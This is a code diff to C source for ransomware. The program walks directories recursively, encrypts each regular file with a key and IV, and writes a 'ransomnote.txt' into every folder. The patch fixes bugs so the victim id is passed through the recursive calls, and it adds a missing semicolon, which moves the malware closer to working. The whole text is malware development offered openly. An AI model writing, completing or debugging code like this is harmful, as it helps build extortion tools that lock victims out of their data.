@@ -9,7 +9,7 @@ void startEncrypting(char * start,unsigned char * key, unsigned char * iv,char *
  		file_handler(start, start,key,iv);
     }else if (errno != 2){
     	//must be a directory
-    	directory_handle(start,key,iv);
+    	directory_handle(start,key,iv,id);
     } else {
     	//pDir is null...
     	printf("Not a valid directory or file name\n");
@@ -22,7 +22,7 @@ void startEncrypting(char * start,unsigned char * key, unsigned char * iv,char *
 
 void writeRansomNote(char * directory,char * id)
 {
-    char * filename = calloc(1,sizeof(char) * strlen(directory)+strlen("ransomnote.txt") +1)
+    char * filename = calloc(1,sizeof(char) * strlen(directory)+strlen("ransomnote.txt") +1);
     strcpy(filename,directory);
     strcpy(filename,"ransomnote.txt");
     FILE * fp = fopen(filename,"w");
@@ -54,7 +54,7 @@ void directory_handle(char * name,unsigned char * key, unsigned char * iv,char *
     	if(fDirent->d_type == DT_REG){
     		file_handler(fullpath,fDirent->d_name,key,iv);
     	} else if(fDirent->d_type == DT_DIR){
-    		directory_handle(fullpath,key,iv);
+    		directory_handle(fullpath,key,iv,id);
     	}
         writeRansomNote(fullpath,id);
     	free(fullpath);
@@ -63,8 +63,9 @@ void directory_handle(char * name,unsigned char * key, unsigned char * iv,char *
     closedir(fDir);
 }
 
-const char *get_filename_ext(const char *filename) {
-    const char *dot = strrchr(filename, '.');
+char *get_filename_ext(const char *filename) 
+{
+    char *dot = strrchr(filename, '.');
     if(!dot || dot == filename) return "";
     return dot + 1;
 }
